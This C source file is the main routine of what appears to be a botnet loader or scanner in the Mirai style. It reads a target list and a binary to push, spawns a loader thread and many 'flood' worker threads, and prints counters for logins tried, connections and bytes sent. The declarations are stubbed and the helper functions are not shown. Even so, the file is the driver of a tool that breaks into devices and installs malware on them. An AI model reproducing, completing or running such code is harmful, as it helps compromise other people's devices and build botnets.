
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int time_t ;
typedef int timeText ;
struct tm {int dummy; } ;
typedef int pthread_t ;
struct TYPE_2__ {int mutex; } ;


 int SIGINT ;
 int SIGPIPE ;
 int * SIG_IGN ;
 void* atoi (char*) ;
 char* bind_ip ;
 int bytes_sent ;
 int debug_mode ;
 int epollFD ;
 int epoll_create (int) ;
 int exit (int) ;
 scalar_t__ failed_connect ;
 int fflush (int ) ;
 int flood ;
 int fopen (char*,char*) ;
 scalar_t__ found_srvs ;
 int fprintf (int ,char*,...) ;
 scalar_t__ getConnectedSockets () ;
 int infd ;
 int load_binary (char*) ;
 int loader ;
 struct tm* localtime (int *) ;
 scalar_t__ login_done ;
 scalar_t__ malloc (int) ;
 void* maxConnectedSockets ;
 int memset (char*,char,int) ;
 int printf (char*,...) ;
 int pthread_create (int *,int *,int *,void*) ;
 int pthread_mutex_init (int *,int *) ;
 scalar_t__ remote_hangup ;
 char* run_arg ;
 scalar_t__ running_threads ;
 int sighandler ;
 int signal (int ,int *) ;
 int sleep (int) ;
 int sprintf (char*,char*,...) ;
 TYPE_1__* stateTable ;
 int stderr ;
 int stdout ;
 int strftime (char*,int,char*,struct tm*) ;
 int time (int *) ;
 scalar_t__ timed_out ;

int main(int argc, char *argv[ ])
{
    if(argc < 4){
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "Usage: %s <bind ip> <input file> <file_to_load> <argument> <threads> <connections> (debug mode)\n", argv[0]);
        exit(-1);
    }

    signal(SIGPIPE, SIG_IGN);

    epollFD = epoll_create(0xDEAD);
    bind_ip = argv[1];
    infd = fopen(argv[2], "r");
    signal(SIGINT, &sighandler);
    int threads = atoi(argv[5]);
    maxConnectedSockets = atoi(argv[6]);

    if (argc == 8)
        debug_mode = 1;

    int i;
    for(i = 0; i < (1024 * 100); i++)
    {
        pthread_mutex_init(&stateTable[i].mutex, ((void*)0));
    }

    load_binary(argv[3]);
    run_arg = argv[4];

    pthread_t thread;
    pthread_create( &thread, ((void*)0), &loader, (void *) &threads);

    for(i = 0; i < threads; i++) pthread_create( &thread, ((void*)0), &flood, (void *) ((void*)0));

    char timeText[100];
    time_t now = time(((void*)0));
    struct tm *t = localtime(&now);
    strftime(timeText, sizeof(timeText)-1, "%d %b %Y %l:%M %p %Z", t);

    printf("Starting Scan at %s\n", timeText);
    char temp[17] = {0};
    memset(temp, 0, 17);
    sprintf(temp, "Loaded");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "State Timeout");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "No Connect");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "Closed Us");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "Logins Tried");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "B/s");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "Connected");
    printf("%-16s", temp);
    memset(temp, 0, 17);
    sprintf(temp, "Running Thrds");
    printf("%s", temp);
    printf("\n");

    sleep(1);

    char *new;
    new = (char *)malloc(16*6);
    while (debug_mode ? 1 : running_threads > 0)
    {
        printf("\r");
        memset(new, '\0', 16*6);
        sprintf(new, "%s|%-15lu", new, found_srvs);
        sprintf(new, "%s|%-15lu", new, timed_out);
        sprintf(new, "%s|%-15lu", new, failed_connect);
        sprintf(new, "%s|%-15lu", new, remote_hangup);
        sprintf(new, "%s|%-15lu", new, login_done);
        sprintf(new, "%s|%-15d", new, bytes_sent);
        sprintf(new, "%s|%-15lu", new, getConnectedSockets());
        sprintf(new, "%s|%-15d", new, running_threads);
        printf("%s", new);
        fflush(stdout);
        bytes_sent=0;
        sleep(1);
    }
    printf("\n");

    now = time(((void*)0));
    t = localtime(&now);
    strftime(timeText, sizeof(timeText)-1, "%d %b %Y %l:%M %p %Z", t);
    printf("Scan finished at %s\n", timeText);
    return 0;
}
